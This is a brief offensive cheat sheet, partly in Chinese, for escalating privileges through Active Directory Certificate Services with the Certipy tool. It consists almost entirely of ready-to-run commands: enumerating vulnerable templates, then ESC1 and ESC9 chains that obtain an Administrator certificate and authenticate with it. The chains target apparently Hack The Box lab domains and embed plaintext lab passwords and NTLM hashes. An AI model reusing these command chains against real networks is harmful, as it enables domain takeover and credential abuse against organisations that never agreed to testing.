### Active Directory Certificates Enumeration
```
certipy-ad find -u xxx -p xxxx -dc-ip xxx.xxx.xxx.xxx -stdout -vulnerable
```
###### AD CS Domain Escalation
```
https://github.com/ly4k/Certipy?tab=readme-ov-file#certificates
```
![image](https://github.com/user-attachments/assets/c6e89df4-194f-4e7b-a9c8-9b6c82a159b0)
```
ESC1:

certipy req -username 'ryan.cooper@sequel.htb' -password 'NuclearMosquito3' -ca 'sequel-DC-CA' -target dc.sequel.htb -template 'UserAuthentication' -upn administrator@sequel.htb
certipy auth -pfx administrator.pfx -username administrator -domain 'SEQUEL.HTB' -dc-ip 10.10.11.202

若 Certipy 在嘗試取得 TGT 時發生 「KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)」，這是因為 KDC 上未啟動 PKInit (Public Key Cryptography for Initial Authentication)

ESC9:
Suppose management_svc@certified.htb holds GenericWrite permissions over ca_operator@certified.htb, with the goal to compromise Administrator@certiified.htbb. The ESC9 certificate template, which ca_operator@certified.htb is permitted to enroll in, is configured with the CT_FLAG_NO_SECURITY_EXTENSION flag in its msPKI-Enrollment-Flag setting

certipy account update -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn Administrator
certipy req -username ca_operator@certified.htb -hashes 'FB54D1C05E301E024800C6AD99FE9B45' -ca certified-DC01-CA -template CertifiedAuthentication -dns DC01.certified.htb
certipy auth -pfx administrator.pfx -domain certified.htb
```
